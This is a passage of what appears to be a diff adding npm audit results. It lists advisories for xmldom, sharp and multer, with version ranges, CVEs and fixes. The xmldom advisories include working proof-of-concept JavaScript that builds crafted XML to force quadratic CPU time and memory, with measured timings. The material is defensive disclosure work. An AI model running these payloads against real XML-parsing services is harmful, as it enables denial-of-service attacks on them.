t0 = process.hrtime.bigint();\n\tvar doc = new DOMParser().parseFromString(xml, 'text/xml');  // silent: no error events\n\tvar ms = Number(process.hrtime.bigint() - t0) / 1e6;\n\tconsole.log(m + ' attrs, ' + xml.length + ' bytes -> ' + ms.toFixed(1) + ' ms; parsed=' +\n\t\tdoc.documentElement.attributes.length);\n}\n```\n\nMeasured with Node.js v18.20.8 (wall-clock; absolute numbers vary by host, the **scaling** is the\nload-bearing fact):\n\n**`@xmldom/xmldom` 0.9.10:**\n\n| M (attributes) | input bytes | time (ms) | ratio vs prev |\n|---:|---:|---:|---:|\n| 2000  | 18,894  | 13.4   | —     |\n| 4000  | 38,894  | 38.7   | ×2.9  |\n| 8000  | 78,894  | 100.8  | ×2.6  |\n| 16000 | 164,894 | 406.2  | ×4.0  |\n| 32000 | 340,894 | 2149.5 | ×5.3  |\n\n**`@xmldom/xmldom` 0.8.13:**\n\n| M (attributes) | input bytes | time (ms) |\n|---:|---:|---:|\n| 2000  | 18,894  | 10.6   |\n| 4000  | 38,894  | 19.9   |\n| 8000  | 78,894  | 75.9   |\n| 16000 | 164,894 | 657.7  |\n| 32000 | 340,894 | 1643.2 |\n\n**`xmldom` (unscoped) 0.6.0:** 4000 → 28.2 ms, 8000 → 131.8 ms, 16000 → 545.2 ms (≈ ×4 per doubling).\n\nTime grows ≈ ×4 per doubling of `M` — quadratic. About **340 KB of well-formed input costs ~1.6–2.1 s\nof single-threaded CPU**, and it keeps scaling: doubling the attribute count quadruples the cost.\nThe document is trivially generated and compresses to a few kilobytes on the wire.\n\n## Impact\n\nUnauthenticated, remotely triggerable denial of service against any service that parses\nattacker-influenced XML/HTML with xmldom. A single request holds one event-loop thread for seconds;\na handful of concurrent requests can saturate CPU and stall the process. Because the payload is a\nplain well-formed document (one element, many attributes), it passes any \"must be well-formed\" gate\nand reaches the parser before any application-level validation (e.g. schema checks or signature\nverification) can run. The payload is highly compressible, so it is effective over compressed\ntransports.\n\n## Fix Applied\n\nReplaced the per-insert linear duplicate scan on the parse-time dedup path with a name-keyed\nindex, so de-duplicating an element's attributes during parse is O(M) instead of O(M²) — a\nwell-formed-but-hostile attribute list can no longer wedge the parse. Behavior-preserving: attribute\norder and duplicate resolution (last value wins, first position kept) are byte-identical. Non-breaking\nand independent of `requireWellFormed`; ships on both maintained versions.",
+      "reported_by": null,
+      "title": "xmldom: Quadratic-time attribute deduplication",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-83613"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "@xmldom/xmldom",
+      "vulnerable_versions": ">=0.9.0 <=0.9.11",
+      "github_advisory_id": "GHSA-8344-3jmq-59r6",
+      "recommendation": "Upgrade to version 0.9.12 or later",
+      "patched_versions": ">=0.9.12",
+      "updated": "2026-09-08T21:01:33.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-407"
+      ],
+      "url": "https://github.com/advisories/GHSA-8344-3jmq-59r6"
+    },
+    "1193711": {
+      "findings": [
+        {
+          "version": "0.9.10",
+          "paths": [
+            "services/api > docxtemplater@3.69.0 > @xmldom/xmldom@0.9.10"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/xmldom/xmldom/security/advisories/GHSA-965w-775f-mr7g\n- https://nvd.nist.gov/vuln/detail/CVE-2026-83615\n- https://github.com/xmldom/xmldom/pull/1071\n- https://github.com/xmldom/xmldom/pull/1072\n- https://github.com/xmldom/xmldom/commit/954370f58c046223faf95ba77efcbc8ce014409d\n- https://github.com/xmldom/xmldom/commit/dabffe884e864eeecb1f515c716f875e1bc47ec1\n- https://github.com/xmldom/xmldom/releases/tag/0.8.15\n- https://github.com/xmldom/xmldom/releases/tag/0.9.12\n- https://github.com/advisories/GHSA-965w-775f-mr7g",
+      "created": "2026-09-08T21:00:52.000Z",
+      "id": 1193711,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nWhen an element declares a namespace prefix, xmldom copies the entire in-scope namespace map\ninto a fresh object and keeps that copy on the element while it is open on the parse stack. A\ncrafted document that nests N elements, each declaring one unique prefix, therefore drives the\nparser to hold on the order of N(N+1)/2 = **O(N²) namespace-map entries at its peak**, so a small,\nhighly compressible input exhausts the heap. Parsing runs under default options on untrusted,\nnetwork-delivered XML, so a sub-megabyte payload can OOM-crash the process before any\napplication-level validation runs — an unauthenticated denial of service.\n\n## Details\n\n`appendElement` performs the copy: `_copy` clones the current namespace map into a fresh object for\neach prefix-declaring element, and the copy is retained on that element's parse-stack entry:\n\n```js\nif (localNSMap == null) {\n    localNSMap = Object.create(null);\n    _copy(currentNSMap, (currentNSMap = Object.create(null)));   // full copy of all ancestor prefixes\n}\ncurrentNSMap[nsPrefix] = localNSMap[nsPrefix] = value;\n...\nel.currentNSMap = currentNSMap;   // retained while the element is open on the parse stack\n```\n\nhttps://github.com/xmldom/xmldom/blob/08a22d78e4bc50f12ce9f5090b8d96ee6031ac7b/lib/sax.js#L467-L540\n\nThe copies stack: the element at depth `i` copies a map of size ~`i`, and every ancestor stays live\non the parse stack until it closes, so at the deepest point Σ`i` namespace entries are held at once.\nThat peak is transient — the completed DOM retains only O(N), one small namespace map per node — but\nit is reached during parsing, which is what OOM-crashes the process.\n\n## Proof of Concept\n\nA minimal document — N nested elements, each declaring one unique namespace prefix (no SAML wrapper\nneeded):\n\n```js\nconst { DOMParser } = require('@xmldom/xmldom');\n\nfunction build(n) {\n  let open = '', close = '';\n  for (let i = 0; i < n; i++) { open += `<a xmlns:p${i}=\"urn:${i}\">`; close = '</a>' + close; }\n  return `<r>${open}${close}</r>`;   // <r><a xmlns:p0=\"urn:0\">...<a xmlns:p{n-1}=\"urn:{n-1}\">...</a>...</r>\n}\n\nfor (const n of [2000, 4000, 8000, 16000]) {\n  const src = build(n);\n  new DOMParser().parseFromString(src, 'text/xml');   // peak memory ~ O(n^2)\n  console.log(n, (src.length / 1024).toFixed(0) + ' KB in', (process.resourceUsage().maxRSS / 1024).toFixed(0) + ' MB peak RSS');\n}\n```\n\nMeasured on Node.js v24 (peak RSS ~quadruples per doubling of depth; absolute numbers vary by host):\n\n| depth  | input   | peak RSS                        |\n| -----: | ------: | ------------------------------- |\n|  2,000 |  56 KB  | 266 MB                          |\n|  4,000 | 115 KB  | 622 MB                          |\n|  8,000 | 232 KB  | 1.9 GB                          |\n| 16,000 | ~470 KB | OOM crash (default ~4 GB heap)  |\n\nAbout 470 KB of trivially-generated, highly-compressible input crashes a default Node.js process;\nlarger depths scale as O(N²) into the tens of GB, crashing larger hosts (as first measured by the\nreporter with a SAML-shaped payload).\n\n## Impact\n\nUnauthenticated denial of service against any service that parses attacker-influenced XML with\nxmldom under default options. A single sub-megabyte request drives multi-gigabyte peak memory and\ncan OOM-crash the process before any application-level validation (e.g. schema checks or a SAML\nsignature verification) runs. The payload is a plain namespace-nesting document and highly\ncompressible, so it is effective over compressed transports (e.g. an HTTP-Redirect / DEFLATE\nbinding, not only POST bindings).\n\n## Severity note\n\nThe CVSS 4.0 vector scores availability only (`VC:N/VI:N/VA:H`): the flaw neither discloses nor\nalters data, it exhausts the heap. `VA:H` is justified because a single unauthenticated,\nnetwork-delivered request (`AV:N/PR:N/UI:N`) of trivial complexity (`AC:L/AT:N`) drives the parser\nto multi-gigabyte peak memory and OOM-crashes the process before any application-level logic runs —\na full loss of availability for the affected service.\n\n## Fix Applied\n\nInherit each element's in-scope namespace map through the prototype chain instead of copying it for every prefix-declaring element, so a deeply namespaced document holds O(N) namespace entries instead of O(N²) at peak. Behavior-preserving: serialized output is byte-identical, only the memory cost drops. Non-breaking and independent of `requireWellFormed`; ships on both maintained versions.",
+      "reported_by": null,
+      "title": "xmldom: Quadratic-memory consumption",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-83615"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "@xmldom/xmldom",
+      "vulnerable_versions": ">=0.9.0 <=0.9.11",
+      "github_advisory_id": "GHSA-965w-775f-mr7g",
+      "recommendation": "Upgrade to version 0.9.12 or later",
+      "patched_versions": ">=0.9.12",
+      "updated": "2026-09-08T21:00:54.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-965w-775f-mr7g"
+    },
+    "1193714": {
+      "findings": [
+        {
+          "version": "0.9.10",
+          "paths": [
+            "services/api > docxtemplater@3.69.0 > @xmldom/xmldom@0.9.10"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/xmldom/xmldom/security/advisories/GHSA-93r5-fhx6-vmg9\n- https://nvd.nist.gov/vuln/detail/CVE-2026-83614\n- https://github.com/xmldom/xmldom/pull/1071\n- https://github.com/xmldom/xmldom/pull/1072\n- https://github.com/xmldom/xmldom/commit/0748720b620555f8c222782dcab575cf0cf403b4\n- https://github.com/xmldom/xmldom/commit/f40ccb861eee0acbf5ee4feb9a34932e87b329c9\n- https://github.com/xmldom/xmldom/releases/tag/0.8.15\n- https://github.com/xmldom/xmldom/releases/tag/0.9.12\n- https://github.com/advisories/GHSA-93r5-fhx6-vmg9",
+      "created": "2026-09-08T21:00:41.000Z",
+      "id": 1193714,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\n`xmldom`'s malformed-input **error-recovery path** has two quadratic-time (O(n²)) behaviors that a\nsingle crafted input triggers together, so a tiny, highly compressible document (tens of KB) stalls\nthe Node.js event loop for multiple seconds. It is reachable from `DOMParser.parseFromString` under\n**default options** — i.e. from unauthenticated, network-delivered XML — making this an unauthenticated\ndenial of service. One of the two behaviors, the `normalize()` adjacent-text merge, is **additionally\nreachable programmatically** — via a plain `normalize()` call on a DOM built with adjacent text nodes,\nindependent of the parser — so its fix must live in `normalize()`, not only in a parser bound.\n\n## Details\n\n### Finding A — `parseElementStartPart` quadratic re-scan\n\nA `<` character is not a delimiter in any tag-parsing state, so `parseElementStartPart` scans\nforward character-by-character over any embedded `<` until it reaches the next `>` (or end of\ninput), then validates the accumulated slice as a tag name and throws `invalid tagName:` on failure.\nThe main loop catches this, reports an `error`, sets `end = -1`, and recovers by advancing a single\ncharacter (`appendText(Math.max(tagStart, start) + 1)`). With a long run of `<` and a distant `>`,\neach of the O(n) recovery retries performs an O(n) scan plus an O(n) anchored regex validation over\nthe growing candidate ⇒ **O(n²)**.\n\nCode (0.9.x, `bb7a085dc5ba1eea3212388509b97bb4b4af32b9`):\n\n- `parseElementStartPart` character scan — https://github.com/xmldom/xmldom/blob/bb7a085dc5ba1eea3212388509b97bb4b4af32b9/lib/sax.js#L263-L461\n- tag-name validation (`setTagName` → throws `invalid tagName`) — https://github.com/xmldom/xmldom/blob/bb7a085dc5ba1eea3212388509b97bb4b4af32b9/lib/sax.js#L886-L891\n- main-loop `catch` → `error` + `end = -1` — https://github.com/xmldom/xmldom/blob/bb7a085dc5ba1eea3212388509b97bb4b4af32b9/lib/sax.js#L234-L242\n- single-character recovery fallback — https://github.com/xmldom/xmldom/blob/bb7a085dc5ba1eea3212388509b97bb4b4af32b9/lib/sax.js#L247\n\nCode (0.8.x, `e5c14802592685bb872c042c54c3f73758875c85`):\n\n- `parseElementStartPart` — https://github.com/xmldom/xmldom/blob/e5c14802592685bb872c042c54c3f73758875c85/lib/sax.js#L227\n- `catch` → `error` + `end = -1` — https://github.com/xmldom/xmldom/blob/e5c14802592685bb872c042c54c3f73758875c85/lib/sax.js#L202-L208\n- recovery fallback — https://github.com/xmldom/xmldom/blob/e5c14802592685bb872c042c54c3f73758875c85/lib/sax.js#L213\n- `setTagName` validation — https://github.com/xmldom/xmldom/blob/e5c14802592685bb872c042c54c3f73758875c85/lib/sax.js#L616-L621\n\n### Finding B — `normalize()` adjacent-text O(K²) merge\n\n`endDocument()` calls `document.normalize()`. For a parent with K adjacent text nodes (produced by\nthe one-character recovery of Finding A), `normalize()` performs K−1 merges. Each merge does a\n`removeChild` — which re-indexes **all** child nodes of the parent (O(K)) — and an `appendData` —\nwhich rebuilds the accumulator string `this.data + text` (O(K)). Total: **O(K²)**.\n\nWell-formed XML cannot produce adjacent text-node siblings *through the parser* (each text run is one\nnode; comments, CDATA, PIs, and elements sit between runs), so the **parse-path** trigger for Finding B\nis the malformed-input recovery that emits single-character text nodes. The same O(K²) merge is,\nhowever, independently reachable via the public `normalize()` API on a programmatically built tree\n(see \"Finding B is additionally reachable programmatically\" below).\n\nCode (0.9.x, `bb7a085dc5ba1eea3212388509b97bb4b4af32b9`):\n\n- `endDocument` → `normalize()` — https://github.com/xmldom/xmldom/blob/bb7a085dc5ba1eea3212388509b97bb4b4af32b9/lib/dom-parser.js#L418-L420\n- `normalize()` adjacent-text merge — https://github.com/xmldom/xmldom/blob/bb7a085dc5ba1eea3212388509b97bb4b4af32b9/lib/dom.js#L1336-L1356\n- `removeChild` re-index-all branch — https://github.com/xmldom/xmldom/blob/bb7a085dc5ba1eea3212388509b97bb4b4af32b9/lib/dom.js#L1788-L1798\n- `appendData` string rebuild — https://github.com/xmldom/xmldom/blob/bb7a085dc5ba1eea3212388509b97bb4b4af32b9/lib/dom.js#L2786-L2790\n\nCode (0.8.x, `e5c14802592685bb872c042c54c3f73758875c85`):\n\n- `endDocument` → `normalize()` — https://github.com/xmldom/xmldom/blob/e5c14802592685bb872c042c54c3f73758875c85/lib/dom-parser.js#L213-L214\n- `normalize()` merge — https://github.com/xmldom/xmldom/blob/e5c14802592685bb872c042c54c3f73758875c85/lib/dom.js#L529-L549\n- `removeChild` re-index-all branch — https://github.com/xmldom/xmldom/blob/e5c14802592685bb872c042c54c3f73758875c85/lib/dom.js#L756-L773\n- `appendData` string rebuild — https://github.com/xmldom/xmldom/blob/e5c14802592685bb872c042c54c3f73758875c85/lib/dom.js#L1533\n\n### Finding B is additionally reachable programmatically (no parser involved)\n\n`Node.prototype.normalize()` is public API on every `Document`/`Element`. A tree built entirely through\nthe ordinary DOM API — `new DOMImplementation().createDocument(...)`, then K× `createTextNode` +\n`appendChild` on one parent — reaches the **same** O(K²) merge when the application calls `normalize()`,\nwith **no** parsing and **no** error-recovery. The parser is only *one* of the two callers of the\nvulnerable merge:\n\n- the parser's automatic `endDocument()` → `document.normalize()` (the parse-path trigger above), and\n- any explicit application call to the public `normalize()` on a tree with adjacent text nodes.\n\n`XMLSerializer` does **not** call `normalize()`, so serializing an un-merged tree is O(total text), not\nO(K²); the O(K²) surface is exactly those two `normalize()` callers. Consequently a parser-side bound\nalone cannot remediate Finding B — the fix must live in `normalize()`.\n\n## Affected Versions\n\nBoth findings are present across the full published `@xmldom/xmldom` history — both\ncurrently-maintained versions (`0.8.x` and `0.9.x`) are affected — and across the retired unscoped\n`xmldom` line. Finding B's `normalize()` merge is additionally reachable **programmatically**: a\ndirect `normalize()` call on a DOM built with adjacent text nodes hits the same O(K²) merge,\nindependent of the parser — so, unlike Finding A, it does not require the malformed-input recovery\npath.\n\n## Proof of Concept\n\nDefault `DOMParser`, no options. The input is trivially compressible (`a<` / `a<>` repeated) and\nnever throws — it is parsed via the recovery path.\n\n```js\nconst { DOMParser } = require('@xmldom/xmldom');\n\n// Silence the expected `error`-level recovery reports (default handler logs\n// them to console.error without throwing; only fatalError throws).\nconsole.error = function () {};\n\nfunction timeParse(label, xml, mime) {\n  const t0 = process.hrtime.bigint();\n  new DOMParser().parseFromString(xml, mime); // completes; no exception\n  const ms = Number(process.hrtime.bigint() - t0) / 1e6;\n  console.log(label + '  bytes=' + Buffer.byteLength(xml) + '  time=' + ms.toFixed(1) + ' ms');\n}\n\nfor (const N of [4000, 8000, 16000, 32000]) {\n  // Finding A: long re-scans, O(n^2) during parse.\n  timeParse('A N=' + N, '<r>' + 'a<'.repeat(N) + '</r>', 'text/xml');\n  // Finding B: short re-scans (cheap parse) but K adjacent text nodes -> O(K^2) in normalize().\n  timeParse('B N=' + N, '<r>' + 'a<>'.repeat(N) + '</r>', 'text/html');\n  // Combined: ONE input hits both A and B under the default parser.\n  timeParse('C N=' + N, '<r>' + 'a<'.repeat(N) + '</r>', 'text/xml');\n}\n```\n\nMeasured on Node v18.20.8 (absolute ms vary by host; the load-bearing fact is that doubling the\ninput ~quadruples the time — canonical O(n²)):\n\nFinding A, isolated (`\"<r>\" + \"a<\"×N + \"</r>\"`, normalize disabled to isolate the re-scan):\n\n| N | input bytes | `@xmldom/xmldom` 0.9.10 | 0.8.13 |\n|--:|--:|--:|--:|\n| 2000 | 4007 | 43 ms | 37 ms |\n| 4000 | 8007 | 129 ms | 106 ms |\n| 8000 | 16007 | 434 ms | 424 ms |\n| 16000 | 32007 | 1629 ms | 1611 ms |\n\nFinding B, isolated (`\"<r>\" + \"a<>\"×N + \"</r>\"`, time attributable to `normalize()`):\n\n| K (N) | input bytes | 0.9.10 | 0.8.13 |\n|--:|--:|--:|--:|\n| 4000 | 12007 | 120 ms | 165 ms |\n| 8000 | 24007 | 589 ms | 771 ms |\n| 16000 | 48007 | 3142 ms | 4448 ms |\n| 32000 | 96007 | 12127 ms | 12951 ms |\n\nCombined (default parser, both findings; `\"<r>\" + \"a<\"×N + \"</r>\"`):\n\n| N | input bytes | 0.9.10 | 0.8.13 |\n|--:|--:|--:|--:|\n| 4000 | 8007 | 341 ms | 397 ms |\n| 8000 | 16007 | 1894 ms | 1641 ms |\n| 16000 | 32007 | 4398 ms | 7661 ms |\n\n~32 KB of input → several seconds of single-threaded event-loop stall.\n\n### Finding B via the public `normalize()` API (no parser)\n\n```js\nconst { DOMImplementation } = require('@xmldom/xmldom');\n\nfunction timeNormalize(K) {\n  const doc = new DOMImplementation().createDocument(null, 'r', null);\n  const el = doc.documentElement;\n  for (let i = 0; i < K; i++) el.appendChild(doc.createTextNode('x')); // K adjacent text nodes\n  const t0 = process.hrtime.bigint();\n  doc.normalize();                                    // O(K^2) merge — no parsing involved\n  const ms = Number(process.hrtime.bigint() - t0) / 1e6;\n  console.log('K=' + K + '  time=' + ms.toFixed(1) + ' ms');\n}\nfor (const K of [2000, 4000, 8000, 16000, 32000]) timeNormalize(K);\n```\n\nMeasured on Node v18.20.8 (doubling K ~quadruples the time — O(K²)):\n\n| K | 0.9.10 | 0.8.13 |\n|--:|--:|--:|\n| 2000 | 5.7 ms | 5.6 ms |\n| 32000 | 1263 ms | 1704 ms |\n\nThis path is reachable by any application that builds a DOM from attacker-influenced data and calls\n`normalize()`, entirely independent of `DOMParser`.\n\n## Impact\n\nAvailability only: a single parse of a small crafted document blocks the Node.js event loop for the\nduration of the quadratic work (multiple seconds at tens of KB; larger inputs scale as O(n²)). No\nmemory blow-up beyond transient strings, no data exposure, no integrity impact. Because XML is\nroutinely accepted from untrusted sources and parsed with default options, one request can stall a\nserver. The payloads are highly compressible, so any endpoint accepting compressed XML faces\nadditional amplification. Finding B is additionally reachable via an explicit `normalize()` call on a\nprogrammatically built DOM (see Proof of Concept), so applications that construct a document from attacker-influenced\ndata and normalize it are exposed even without parsing.\n\n## Severity note\n\nThe complexity is **quadratic**, not exponential, so a multi-second stall requires\ntens-to-hundreds of KB of input. `VA:H` reflects that xmldom applies **no** input-size limit and the\npath runs on default-options parsing, so a single unbounded parse can fully stall the event loop.\n\n## Fix Applied\n\nTwo independent, non-breaking fixes shipped together — each alone leaves the other's quadratic cost dominating the default parse.\nFinding A — terminate the malformed tag-name scan at an embedded `<`, so error recovery is linear instead of O(n²). DOM output is unchanged; only the reported error-message text differs (error strings are not a semver contract).\nFinding B — merge adjacent text nodes in `normalize()` in O(K) instead of O(K²), which also closes the same slowdown reachable programmatically through a direct `normalize()` call. Both ship on both maintained versions.",
+      "reported_by": null,
+      "title": "xmldom: Quadratic-time parsing via the malformed-input recovery path — `parseElementStartPart` re-scan and `normalize()` adjacent-text merge",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-83614"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "@xmldom/xmldom",
+      "vulnerable_versions": ">=0.9.0 <=0.9.11",
+      "github_advisory_id": "GHSA-93r5-fhx6-vmg9",
+      "recommendation": "Upgrade to version 0.9.12 or later",
+      "patched_versions": ">=0.9.12",
+      "updated": "2026-09-08T21:00:43.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-407"
+      ],
+      "url": "https://github.com/advisories/GHSA-93r5-fhx6-vmg9"
+    },
+    "1193725": {
+      "findings": [
+        {
+          "version": "0.35.3",
+          "paths": [
+            "services/api > sharp@0.35.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/lovell/sharp/security/advisories/GHSA-rgj7-g3m4-5g8c\n- https://github.com/strukturag/libheif/security/advisories/GHSA-2jg2-4ch7-h545\n- https://github.com/strukturag/libheif/security/advisories/GHSA-g89c-p67h-r497\n- https://github.com/lovell/sharp/releases/tag/v0.35.4\n- https://github.com/advisories/GHSA-rgj7-g3m4-5g8c",
+      "created": "2026-09-08T21:25:11.000Z",
+      "id": 1193725,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nA number of vulnerabilities, two rated as \"Critical\" severity using CVSSv3, have been discovered and fixed in the upstream libheif dependency. These can lead to possible remote code execution (RCE) on glibc-based Linux when run under certain conditions.\n\nThe attack vector for these claims to be \"network\" however sharp does not provide any networking features so this vulnerability is down-rated to a \"High\" severity using CVSSv4 but please note its Subsequent System Impact.\n\nThose processing untrusted input with versions of sharp prior to 0.35.4 are affected.\n\n### Patches\n\n#### Using prebuilt binaries provided by sharp?\n\nMost people rely on the prebuilt binaries provided by sharp.\n\nPlease upgrade sharp to the latest version, currently 0.35.4, which provides libheif 1.23.2.\n\n#### Using a globally-installed libheif?\n\nPlease ensure you are using the latest libheif 1.23.2.\n\n### Workarounds\nAdd the following to your code to prevent sharp from decoding AVIF images.\n```js\nsharp.block({ operation: [\"VipsForeignLoadHeif\"] });\n```\n\nEnsure you are using a `node` executable binary compiled as a Position Independent Executable (PIE). Most Linux package managers already do this for protection against RCE however be warned that the \"official\" Node.js binaries do not.\n\n### References\n- [CVE-2026-84383](https://github.com/strukturag/libheif/security/advisories/GHSA-g89c-p67h-r497)\n- https://github.com/strukturag/libheif/security/advisories/GHSA-2jg2-4ch7-h545",
+      "reported_by": null,
+      "title": "sharp: Vulnerabilities in libheif: GHSA-g89c-p67h-r497 and GHSA-2jg2-4ch7-h545",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "sharp",
+      "vulnerable_versions": "<0.35.4",
+      "github_advisory_id": "GHSA-rgj7-g3m4-5g8c",
+      "recommendation": "Upgrade to version 0.35.4 or later",
+      "patched_versions": ">=0.35.4",
+      "updated": "2026-09-08T21:25:12.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-122"
+      ],
+      "url": "https://github.com/advisories/GHSA-rgj7-g3m4-5g8c"
+    },
+    "1193790": {
+      "findings": [
+        {
+          "version": "2.2.0",
+          "paths": [
+            "services/api > @nestjs/core@10.4.22 > @nestjs/platform-express@10.4.22 > multer@2.2.0",
+            "services/api > @nestjs/platform-express@10.4.22 > multer@2.2.0"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/expressjs/multer/security/advisories/GHSA-wc9g-mqfw-jrwm\n- https://nvd.nist.gov/vuln/detail/CVE-2026-77078\n- https://github.com/expressjs/multer/commit/87a584e8c8d4da873292635fa1d8c4d78d985b76\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/expressjs/multer/releases/tag/v2.3.0\n- https://github.com/advisories/GHSA-wc9g-mqfw-jrwm",
+      "created": "2026-09-08T21:30:20.000Z",
+      "id": 1193790,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA vulnerability in multer allows a remote, unauthenticated attacker to crash the Node.js process with a single `multipart/form-data` request. Two specially crafted text field names cause an uncaught `RangeError: Invalid array length` inside multer's field parsing, which is not routed to the application error handler and terminates the process. All applications using multer to parse multipart requests are affected.\n\n### Patches\n\nUsers should upgrade to `2.3.0`.\n\n### Workarounds\n\nNone.",
+      "reported_by": null,
+      "title": "multer vulnerable to Denial of Service via crafted multipart field names",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-77078"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "multer",
+      "vulnerable_versions": "<2.3.0",
+      "github_advisory_id": "GHSA-wc9g-mqfw-jrwm",
+      "recommendation": "Upgrade to version 2.3.0 or later",
+      "patched_versions": ">=2.3.0",
+      "updated": "2026-09-08T21:30:22.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-248"
+      ],
+      "url": "https://github.com/advisories/GHSA-wc9g-mqfw-jrwm"
+    },
+    "1193791": {
+      "findings": [
+        {
+          "version": "2.2.0",
+          "paths": [
+            "services/api > @nestjs/core@10.4.22 > @nestjs/platform-express@10.4.22 > multer@2.2.0",
+            "services/api > @nestjs/platform-express@10.4.22 > multer@2.2.0"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/expressjs/multer/security/advisories/GHSA-qfvm-cv95-jqjf\n- https://nvd.nist.gov/vuln/detail/CVE-2026-77037\n- https://github.com/expressjs/multer/commit/eef74440b491ef0f976f3d25895e8089ae495df0\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/expressjs/multer/releases/tag/v2.3.0\n- https://github.com/advisories/GHSA-qfvm-cv95-jqjf",
+      "created": "2026-09-08T21:29:51.000Z",
+      "id": 1193791,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA vulnerability in multer `2.2.0` allows an attacker to trigger a Denial of Service (DoS) by aborting or truncating multipart uploads. When using `diskStorage`, the destination write stream is not closed if the upload is aborted before it finishes, so each failed request leaks an open file descriptor and retains its disk blocks until the process exits. Repeated failed uploads can exhaust the available file descriptors. All applications using multer's disk storage are affected.\n\n### Patches\n\nUsers should upgrade to `2.3.0`.\n\n### Workarounds\n\nNone.",
+      "reported_by": null,
+      "title": "multer vulnerable to Denial of Service via file descriptor leak on aborted uploads",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-77037"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "multer",
+      "vulnerable_versions": "=2.2.0",
+      "github_advisory_id": "GHSA-qfvm-cv95-jqjf",
+      "recommendation": "Upgrade to version 2.3.0 or later",
+      "patched_versions": ">=2.3.0",
+      "updated": "2026-09-08T21:29:51.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-459"
+      ],
+      "url": "https://github.com/advisories/GHSA-qfvm-cv95-jqjf"
+    },
+    "1193792": {
+      "findings": [
+        {
+          "version": "2.2.0",
+          "paths": [
+            "services/api > @nestjs/core@10.4.22 > @nestjs/platform-express@10.4.22 > multer@2.2.0",
+            "services/api > @nestjs/platform-express@10.4.22 > multer@2.2.0"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/expressjs/multer/security/advisories/GHSA-qvfw-j98x-7q72\n- https://nvd.nist.gov/vuln/detail/CVE-2026-77063\n- https://github.com/expressjs/multer/commit/ab6aeae650328cf31799dcfa4c3e116ba8faaacc\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/expressjs/multer/releases/tag/v2.3.0\n- https://github.com/advisories/GHSA-qvfw-j98x-7q72",
+      "created": "2026-09-08T21:29:42.000Z",
+      "id": 1193792,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nWhen `multer` is configured with an asynchronous `fileFilter`, the `limits.fileSize` limit can be bypassed. The `'limit'` event is registered inside the async `fileFilter` callback, so if a file exceeds `limits.fileSize` before that callback runs, the event is missed and the oversized upload is accepted instead of being rejected with a `LIMIT_FILE_SIZE` error. Applications that rely on `limits.fileSize` to reject oversized uploads are affected on all upload methods (`.single()`, `.array()`, `.fields()`, `.any()`). Uploads using a synchronous `fileFilter` are not affected.\n\n### Patches\n\nUsers should upgrade to `2.3.0`.\n\n### Workarounds\n\nUse a synchronous `fileFilter`, or validate the uploaded file size after the upload completes.",
+      "reported_by": null,
+      "title": "multer vulnerable to file size limit bypass via async fileFilter race condition",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-77063"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "multer",
+      "vulnerable_versions": "<2.3.0",
+      "github_advisory_id": "GHSA-qvfw-j98x-7q72",
+      "recommendation": "Upgrade to version 2.3.0 or later",
+      "patched_versions": ">=2.3.0",
+      "updated": "2026-09-08T21:29:43.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-362"
+      ],
+      "url": "https://github.com/advisories/GHSA-qvfw-j98x-7q72"
+    },
+    "1193793": {
+      "findings": [
+        {
+          "version": "2.2.0",
+          "paths": [
+            "services/api > @nestjs/core@10.4.22 > @nestjs/platform-express@10.4.22 > multer@2.2.0",
+            "services/api > @nestjs/platform-express@10.4.22 > multer@2.2.0"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
